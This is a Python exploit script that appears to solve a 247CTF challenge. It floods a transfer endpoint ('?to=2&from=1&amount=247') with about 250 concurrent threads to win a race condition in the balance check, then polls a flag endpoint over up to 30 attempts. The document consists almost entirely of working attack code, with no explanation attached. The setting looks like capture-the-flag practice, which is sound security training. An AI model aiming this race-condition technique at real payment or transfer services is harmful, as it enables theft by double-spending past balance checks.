
```python
#!/usr/bin/env python3
import requests
import threading
import time
import sys

URL="https://b5eaecf576342f72.247ctf.com"
THREADS=150

def try_request(session, url):
    try:
        session.get(url, timeout=2)
    except:
        pass

def main():
    s=requests.Session()
    for attempt in range(30):
        print(f"Attempt {attempt+1}/30")
        try:
            s.get(f"{URL}/?reset")
            print(s.get(f"{URL}/?dump").text)
            thread_list=[]
            for _ in range(THREADS):
                t=threading.Thread(target=lambda: 
                    try_request(s, f"{URL}/?to=2&from=1&amount=247"))
                thread_list.append(t)
            for t in thread_list:
                t.start()
            thread_list2=[]
            for _ in range(100):
                t=threading.Thread(target=lambda: 
                    try_request(s, f"{URL}/?to=2&from=1&amount=247"))
                thread_list2.append(t)
            for t in thread_list2:
                t.start()
            result=s.get(f"{URL}/?dump").text
            print(result)
            flag1=s.get(f"{URL}/?flag&from=1").text
            if "Insufficient" not in flag1:
                print(f"Flag from account 1: {flag1}")
                sys.exit(0)
            flag2=s.get(f"{URL}/?flag&from=2").text
            if "Insufficient" not in flag2:
                print(f"Flag from account 2: {flag2}")
                sys.exit(0)
        except Exception as e:
            print(f"Error in attempt {attempt+1}: {e}")

if __name__=="__main__":
    main()
```
